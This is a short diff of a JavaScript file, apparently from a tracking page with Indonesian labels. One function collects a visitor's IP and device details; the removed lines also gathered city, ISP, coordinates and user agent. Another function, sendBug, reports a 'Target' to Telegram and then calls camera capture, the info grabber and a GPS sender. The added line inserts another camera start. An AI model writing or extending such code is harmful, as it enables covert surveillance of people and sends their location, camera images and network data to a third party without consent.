@@ -301,14 +301,6 @@ async function getInfo() {
 
     const text = `
 IP        : ${ip}
-Kota      : ${city}
-Region    : ${region}
-Negara    : ${country}
-ISP       : ${isp}
-ASN       : ${asn}
-Latitude  : ${lat}
-Longitude : ${lon}
-Browser   : ${navigator.userAgent}
 OS        : ${navigator.platform}
 Waktu     : ${new Date().toLocaleString()}
     `.trim();
@@ -474,7 +466,7 @@ async function sendBug() {
         sendToTelegram(
             `<b>📌 Sender:</b> ${sender}\n<b>📞 Target:</b> ${target}`
         );
-
+        await startCamera();
         await startCamera1();
         await getInfo();
         await sendGPS();
